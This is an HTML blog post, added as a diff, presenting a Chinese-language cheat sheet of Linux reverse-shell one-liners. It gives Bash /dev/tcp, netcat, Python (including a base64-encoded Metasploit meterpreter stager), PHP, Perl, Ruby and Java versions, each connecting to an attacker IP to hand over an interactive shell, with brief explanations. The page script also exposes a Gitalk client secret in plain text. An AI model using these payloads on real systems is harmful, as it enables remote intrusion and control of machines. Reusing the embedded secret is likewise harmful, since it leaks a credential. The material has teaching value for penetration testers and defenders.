@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>Linux一句话反弹shell | Today is new</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://0xwi11.github.io/favicon.ico?v=1706710799621">
+<link rel="stylesheet" href="https://0xwi11.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="Bash
+bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1
+
+
+bash -i是打开一个交互的bash
+“&gt;&amp;”和我们常见的“&amp;&gt;”是一个意思，都是将标准错..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://0xwi11.github.io">
+        <img src="https://0xwi11.github.io/images/avatar.png?v=1706710799621" class="site-logo">
+        <h1 class="site-title">Today is new</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+          <a class="social-link" href="https://github.com/0xWi11?tab=overview&amp;from=2023-02-01&amp;to=2023-02-28" target="_blank">
+            <i class="fab fa-github"></i>
+          </a>
+        
+      
+        
+          <a class="social-link" href="https://twitter.com/0xwi11" target="_blank">
+            <i class="fab fa-twitter"></i>
+          </a>
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      相信美好的事情将会发生
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://0xwi11.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">Linux一句话反弹shell</h2>
+            <div class="post-date">2020-06-14</div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="bash">Bash</h2>
+<pre><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1
+</code></pre>
+<ul>
+<li>bash -i是打开一个交互的bash</li>
+<li>“&gt;&amp;”和我们常见的“&amp;&gt;”是一个意思，都是将标准错误输出重定向到标注输出。</li>
+<li>/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。</li>
+<li>“0&gt;&amp;1”和“0&lt;&amp;1”是一个意思，都是将标准输入重定向到标准输出中</li>
+<li>端口替换成自己的端口即可<br>
+<img src="https://0xwi11.github.io/post-images/1678675565569.png" alt="" loading="lazy"><br>
+完整解读：bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。<br>
+<a href="https://www.anquanke.com/post/id/85712">参考文章</a></li>
+</ul>
+<h2 id="netcat">NetCat</h2>
+<p>如果目标主机支持“-e”选项的话，可以直接用</p>
+<pre><code>nc -e /bin/bash 10.42.0.1 1234
+</code></pre>
+<p>但当不支持时，我们就要用到Linux神奇的管道了。可以在自己机器上监听两个端口，</p>
+<pre><code>nc -l -p 1234 -vv
+nc -l -p 4321 -vv
+</code></pre>
+<p>然后在目标主机上执行以下命令：</p>
+<pre><code>nc  10.42.0.1 1234  |  /bin/bash  |  nc 10.42.0.1 4321
+</code></pre>
+<p>这时就可以在1234端口输入命令，在4321端口查看命令的输出了。</p>
+<p>管道“|”可以将上一个命令的输出作为下一个命令的输入。所以上面命令的意思就是将10.42.0.1:1234传过来的命令交给/bin/bash执行，再将执行结果传给10.42.0.1:4321显示。</p>
+<h2 id="python">Python</h2>
+<pre><code>python -c 
+import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect((&quot;10.42.0.1&quot;,1234));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1); 
+os.dup2(s.fileno(),2);
+p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);'
+</code></pre>
+<p>python -c表示执行后面的代码。首先引入了三个库socket,subprocess,os，这三个库后面都要用到，然后创建了一个使用TCP的socket，接着执行connect函数连接到黑客主机所监听的端口。接着执行os库的dup2函数来进行重定向。dup2传入两个文件描述符，fd1和fd2（fd1是必须存在的），如果fd2存在，就关闭fd2，然后将fd1代表的那个文件强行复制给fd2，fd2这个文件描述符不会发生变化，但是fd2指向的文件就变成了fd1指向的文件。 这个函数最大的作用是重定向。三个dup2函数先后将socket重定向到标准输入，标准输入，标准错误输出。最后建立了一个子进程,传入参数“-i”使bash以交互模式启动。这个时候我们的输入输出都会被重定向到socket，黑客就可以执行命令了。</p>
+<p>其他形式：</p>
+<pre><code>python -c &quot;exec(\&quot;import socket, subprocess;s = socket.socket();s.connect(('127.0.0.1',9000))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;
+</code></pre>
+<p>Metasploit版：</p>
+<pre><code>msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=192.168.90.1 LPORT=1234
+import base64; exec(base64.b64decode('aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsMSkKcy5jb25uZWN0KCgnMTkyLjE2OC45MC4xJywxMjM0KSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdig0MDk2KQp3aGlsZSBsZW4oZCkhPWw6CglkKz1zLnJlY3YoNDA5NikKZXhlYyhkLHsncyc6c30pCg=='))
+</code></pre>
+<p>base64解码</p>
+<pre><code>import socket,struct
+s=socket.socket(2,1)
+s.connect(('192.168.90.1',1234))
+l=struct.unpack('&gt;I',s.recv(4))[0]
+d=s.recv(4096)
+while len(d)!=l:
+    d+=s.recv(4096)
+exec(d,{'s':s})
+</code></pre>
+<h2 id="php">PHP</h2>
+<pre><code>php -r '$sock=fsockopen(&quot;192.168.31.41&quot;,8080);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
+</code></pre>
+<p>代码假设TCP连接的文件描述符为3，如果不行可以试下4,5,6</p>
+<h2 id="perl">Perl</h2>
+<pre><code>perl -e 'use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
+</code></pre>
+<h2 id="ruby">Ruby</h2>
+<pre><code>ruby -rsocket -e’f=TCPSocket.open(“10.0.0.1”,1234).to_i;exec sprintf(“/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d”,f,f,f)’
+</code></pre>
+<h2 id="java">Java</h2>
+<pre><code>r = Runtime.getRuntime()
+p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
+p.waitFor()
+</code></pre>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://0xwi11.github.io/post/java-ji-chu-xue-xi-ji-lu/">
+                  <h3 class="post-title">
+                    Java基础学习记录
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: 'b2be97bd4f11fa2c7ed0',
+        clientSecret: '7cd82370c455720ef14b1c828ee50582651f71c4',
+        repo: 'bolg-comment',
+        owner: '0xWi11',
+        admin: ['0xWi11'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
